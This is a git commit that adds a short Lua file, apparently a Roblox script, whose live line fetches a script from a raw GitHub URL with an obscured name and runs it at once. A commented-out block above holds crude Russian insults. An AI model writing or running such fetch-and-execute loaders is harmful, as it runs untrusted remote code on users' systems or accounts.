ef1cfe385f80f6a2e4c193cf3fee7cf03b56208d
q7r1pl4z33 <andrejzakirov71@gmail.com>
2026-03-10 03:42:52 +0300

    koza.lua

---
+++ koza.lua
@@ -0,0 +1,9 @@
+--[[
+    momAlive = false
+    if momAlive then
+      print("я ебу твою мать")
+    else
+      print("твоя мать сдохла")
+    end
+]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/q7r1pl4z33/nWmZqW/refs/heads/main/xKqLzRmP_applecherry"))()
